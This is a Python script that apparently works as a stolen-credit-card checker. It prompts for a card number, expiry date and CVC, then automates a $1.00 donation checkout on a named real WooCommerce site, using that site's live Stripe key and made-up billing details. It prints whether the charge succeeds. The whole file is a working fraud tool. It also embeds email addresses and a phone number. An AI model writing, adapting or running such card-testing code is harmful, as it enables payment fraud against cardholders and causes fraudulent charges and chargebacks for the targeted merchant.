import requests
from bs4 import BeautifulSoup
import re

session = requests.Session()

# Basic headers
headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
}
base_url = "https://indepsquare.com"

# ─────────────────────────────
# Prompt user for CC input
raw_input = input("ENTER CC: ").strip()
pattern = r"(\d{12,16})[|:/\s]+(\d{1,2})[|:/\s]+(\d{2,4})[|:/\s]+(\d{3,4})"
match = re.search(pattern, raw_input)
if not match:
    print("❌ Invalid format. Use: 1234567890123456|02|28|123")
    exit()

cc_number, exp_month, exp_year, cvc = match.groups()
if len(exp_year) == 2:
    exp_year = "20" + exp_year
exp_month = exp_month.zfill(2)

# ─────────────────────────────
try:
    print("[1] Adding custom donation product to cart...")
    donation_url = f"{base_url}/product/donate/"
    donation_data = {
        "woonp": "1.00",
        "quantity": "1",
        "add-to-cart": "510"
    }
    donation_headers = headers.copy()
    donation_headers.update({
        "Origin": base_url,
        "Referer": donation_url,
        "Content-Type": "application/x-www-form-urlencoded"
    })
    session.post(donation_url, headers=donation_headers, data=donation_data)

    print("[2] Visiting cart...")
    cart_page = session.get(f"{base_url}/cart/", headers=headers)
    print("Cart page title:", BeautifulSoup(cart_page.text, "html.parser").title.text)

    print("[3] Visiting checkout...")
    checkout_page = session.get(f"{base_url}/checkout/", headers=headers)
    soup = BeautifulSoup(checkout_page.text, "html.parser")
    print("Checkout page title:", soup.title.text)

    nonce = soup.select_one('input[name="woocommerce-process-checkout-nonce"]')['value']

    print("[4] Creating Stripe payment method...")
    stripe_data = {
        "billing_details[name]": "Error Op",
        "billing_details[email]": "rohitrajbot@gmail.com",
        "billing_details[phone]": "2023697415",
        "billing_details[address][city]": "New York",
        "billing_details[address][country]": "US",
        "billing_details[address][line1]": "New York",
        "billing_details[address][postal_code]": "10080",
        "billing_details[address][state]": "NY",
        "type": "card",
        "card[number]": cc_number,
        "card[cvc]": cvc,
        "card[exp_year]": exp_year,
        "card[exp_month]": exp_month,
        "key": "pk_live_51Isr7IE5jlDJzIEwdBHuVbfLAsPNVLC24C04fuFQ9o9TfVSe6WWdZvboJoR224Wnc6uqbhakBObedEd0RHwhRRgs00m4w9HIkC",
    }

    stripe_headers = {
        "User-Agent": headers["User-Agent"],
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
    }

    stripe_res = session.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data)
    stripe_json = stripe_res.json()

    if "id" not in stripe_json:
        print("❌ Stripe Payment creation failed:", stripe_json)
        exit()

    payment_method_id = stripe_json["id"]
    print("✅ Stripe Payment Method:", payment_method_id)

    print("[5] Submitting WooCommerce checkout...")

    checkout_data = {
        "billing_email": "zee5year@hldrive.com",
        "billing_first_name": "Error",
        "billing_last_name": "Op",
        "billing_country": "US",
        "billing_address_1": "New York",
        "billing_city": "New York",
        "billing_state": "NY",
        "billing_postcode": "10080",
        "billing_phone": "2023697415",
        "payment_method": "stripe",
        "wc-stripe-is-deferred-intent": "1",
        "woocommerce-process-checkout-nonce": nonce,
        "_wp_http_referer": "/?wc-ajax=update_order_review",
        "wc-stripe-payment-method": payment_method_id,
    }

    checkout_headers = headers.copy()
    checkout_headers.update({
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": f"{base_url}/checkout/",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": base_url,
    })

    final_res = session.post(f"{base_url}/?wc-ajax=checkout", headers=checkout_headers, data=checkout_data)
    print("Checkout response status:", final_res.status_code)

    try:
        res_json = final_res.json()
        print(res_json)
    except Exception as e:
        print("❌ Error parsing response:", e)
        print(final_res.text)

except Exception as e:
    print("❌ Error occurred:", e)
